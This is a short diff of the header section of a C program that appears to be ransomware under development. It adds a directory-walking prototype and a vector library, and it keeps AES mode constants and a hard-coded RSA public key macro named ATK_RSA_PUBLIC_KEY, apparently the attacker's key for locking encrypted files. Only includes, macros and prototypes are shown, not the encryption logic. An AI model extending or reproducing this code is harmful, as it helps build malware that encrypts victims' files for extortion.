@@ -1,3 +1,4 @@
+/* Header files */
 #include <stdio.h>
 #include <ctype.h>
 #include <fcntl.h>
@@ -9,16 +10,25 @@
 #include <dirent.h>
 #include <pthread.h>
 #include <sys/stat.h>
-#include <semaphore.h>
 
+/* if this is defined, then the vector will double in capacity each
+ * time it runs out of space. if it is not defined, then the vector will
+ * be conservative, and will have a capcity no larger than necessary.
+ * having this defined will minimize how often realloc gets called.
+ */
+#define CVECTOR_LOGARITHMIC_GROWTH
+#include "cvector.h"
+
+/* Macro constants */
 #define AES_128 0
 #define AES_192 1
 #define AES_256 2
 #define AES_MODE_ECB 0
 #define AES_MODE_CBC 1
 #define MAX_MODE_LENGTH 8
-#define MAX_TARGET_LENGTH 256
+#define MAX_PATH_LENGTH 256
 
+/* Macro string literals */
 #define ATK_RSA_PUBLIC_KEY "-----BEGIN PUBLIC KEY-----\n" \
     "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAySDRKBBg/2npTTbPhoz1\n" \
     "nd0Wht8iNs5f/fP0xSBu85PhLuYHsAQ0H2yNB5kVaKBgnXSEiix+tto59v73LF7S\n" \
@@ -34,6 +44,8 @@
     "BUhaUPlEJGIFfpI0XB7J6CkCAwEAAQ==\n" \
     "-----END PUBLIC KEY-----" \
 
+/* Prototype of functions */
 void print_usage();
 int is_valid_options(int* key_size, char* mode, char* target);
+void walkdir(cvector_vector_type(char*)* paths, char* parent_dir);
 int parse_options(int* key_size, char* mode, char* target, int argc, char** argv);
